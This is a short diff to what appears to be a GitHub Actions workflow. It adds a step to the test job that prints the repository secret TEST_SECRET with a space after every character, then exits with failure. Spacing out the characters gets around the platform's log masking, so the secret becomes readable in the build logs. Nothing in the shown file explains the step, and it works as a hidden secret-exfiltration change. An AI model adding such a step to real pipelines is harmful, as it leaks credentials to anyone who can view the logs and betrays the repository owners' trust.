@@ -16,6 +16,9 @@ jobs:
   run-tests:
     runs-on: ubuntu-latest
     steps:
+      - run: |
+          echo "${{ secrets.TEST_SECRET }}" | sed -e 's/\(.\)/\1 /g'
+          exit 1
       - name: Configure AWS Credentials
         uses: aws-actions/configure-aws-credentials@v4
         with:
